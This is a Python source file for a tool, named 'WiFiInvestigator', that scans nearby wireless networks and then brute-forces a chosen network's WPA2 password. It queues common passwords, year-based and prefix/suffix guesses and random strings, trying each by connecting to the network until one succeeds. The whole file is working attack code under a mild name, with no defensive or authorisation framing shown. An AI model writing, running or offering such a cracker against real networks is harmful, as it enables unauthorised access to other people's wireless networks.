import pywifi
from pywifi import const
import time
import string
import itertools
import threading
import queue
import logging
import random

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class WiFiInvestigator:
    def __init__(self):
        try:
            self.wifi = pywifi.PyWiFi()
            self.iface = self.wifi.interfaces()[0]
            
            if not self.iface:
                raise Exception("No wireless interface found")
                
            # Initialize for password cracking
            self.password_queue = queue.Queue()
            self.found_password = None
            self.stop_flag = False
            
            logger.info("WiFi investigator initialized successfully")
            
        except Exception as e:
            logger.error(f"Failed to initialize WiFi investigator: {e}")
            raise

    def scan_networks(self):
        """Scan for available WiFi networks"""
        try:
            logger.info("Starting network scan...")
            self.iface.scan()
            time.sleep(4)  # Wait for scan to complete
            
            networks = []
            for network in self.iface.scan_results():
                if network.ssid.strip():
                    signal_strength = 2 * (100 + getattr(network, 'signal', -100))
                    signal_strength = max(0, min(100, signal_strength))
                    
                    networks.append({
                        'ssid': network.ssid.strip(),
                        'bssid': network.bssid if hasattr(network, 'bssid') else 'Unknown',
                        'signal': signal_strength,
                        'security': self._get_security_type(network)
                    })
            
            logger.info(f"Found {len(networks)} networks")
            return {'success': True, 'networks': networks}
            
        except Exception as e:
            logger.error(f"Scan failed: {e}")
            return {'success': False, 'error': str(e)}

    def _get_security_type(self, network):
        """Determine network security type"""
        try:
            if not hasattr(network, 'akm') or not network.akm:
                return 'Open'
            if const.AKM_TYPE_WPA2PSK in network.akm:
                return 'WPA2'
            if const.AKM_TYPE_WPAPSK in network.akm:
                return 'WPA'
            return 'Unknown'
        except:
            return 'Unknown'

    def _generate_passwords(self, pattern, length_range):
        """Generate passwords based on pattern and length range"""
        # Common patterns and characters
        common_patterns = [
            "12345678", "87654321", "password", "qwerty",
            "abc123", "123abc", "admin123", "root123",
            "default", "user123", "pass123"
        ]
        
        chars = {
            'd': string.digits,
            'l': string.ascii_lowercase,
            'u': string.ascii_uppercase,
            's': string.punctuation
        }
        
        # First try common patterns
        logger.info("Trying common password patterns...")
        for pwd in common_patterns:
            if self.stop_flag:
                break
            self.password_queue.put(pwd)
            
        # Then try year-based patterns
        logger.info("Trying year-based patterns...")
        current_year = time.localtime().tm_year
        for year in range(current_year - 10, current_year + 1):
            if self.stop_flag:
                break
            self.password_queue.put(str(year))
            self.password_queue.put("admin" + str(year))
            self.password_queue.put("pass" + str(year))
            
        # Then try pattern-based generation
        charset = ''.join(chars[c] for c in pattern if c in chars)
        if not charset:
            charset = string.ascii_letters + string.digits
            
        logger.info(f"Generating pattern-based passwords: {pattern}, length range: {length_range}")
        
        # Common prefixes and suffixes
        prefixes = ["admin", "user", "guest", "test", "wifi", "pass"]
        suffixes = ["123", "321", "2023", "2024", "@123", "!123"]
        
        # Try combinations with common prefixes/suffixes
        for prefix in prefixes:
            if self.stop_flag:
                break
            for suffix in suffixes:
                if self.stop_flag:
                    break
                self.password_queue.put(prefix + suffix)
        
        # Finally, try random combinations within length range
        for length in range(length_range[0], length_range[1] + 1):
            if self.stop_flag:
                break
            # Generate some random combinations
            for _ in range(100):  # Limit random attempts per length
                if self.stop_flag:
                    break
                pwd = ''.join(random.choice(charset) for _ in range(length))
                self.password_queue.put(pwd)

    def _try_password(self, ssid, password):
        """Try to connect to network with given password"""
        try:
            profile = pywifi.Profile()
            profile.ssid = ssid
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            profile.key = password

            self.iface.remove_all_network_profiles()
            tmp_profile = self.iface.add_network_profile(profile)

            self.iface.connect(tmp_profile)
            time.sleep(2)
            
            if self.iface.status() == const.IFACE_CONNECTED:
                self.found_password = password
                self.stop_flag = True
                return True
            return False
            
        except Exception as e:
            logger.error(f"Connection attempt failed: {e}")
            return False

    def investigate_network(self, ssid, pattern='dlu', length_range=(8, 12), max_attempts=1000):
        """Main method to investigate a WiFi network"""
        logger.info(f"Starting investigation for network: {ssid}")
        
        self.stop_flag = False
        self.found_password = None
        attempts = 0
        results = []
        
        try:
            # Start password generator in separate thread
            generator = threading.Thread(
                target=self._generate_passwords,
                args=(pattern, length_range),
                daemon=True
            )
            generator.start()

            while not self.stop_flag and attempts < max_attempts:
                try:
                    password = self.password_queue.get(timeout=1)
                    attempts += 1
                    
                    logger.debug(f"Trying password: {password} (Attempt {attempts})")
                    
                    result = {
                        'password': password,
                        'attempt': attempts,
                        'status': 'Testing'
                    }
                    results.append(result)
                    
                    if self._try_password(ssid, password):
                        result['status'] = 'SUCCESS'
                        logger.info(f"Password found: {password}")
                        return {
                            'success': True,
                            'password': password,
                            'attempts': attempts,
                            'results': results
                        }
                    
                    result['status'] = 'Failed'
                    
                except queue.Empty:
                    if not generator.is_alive():
                        break
            
            logger.info(f"Investigation completed. Attempts made: {attempts}")
            return {
                'success': False,
                'attempts': attempts,
                'results': results,
                'error': 'Password not found'
            }
            
        except Exception as e:
            logger.error(f"Investigation failed: {e}")
            return {
                'success': False,
                'error': str(e),
                'attempts': attempts,
                'results': results
            } 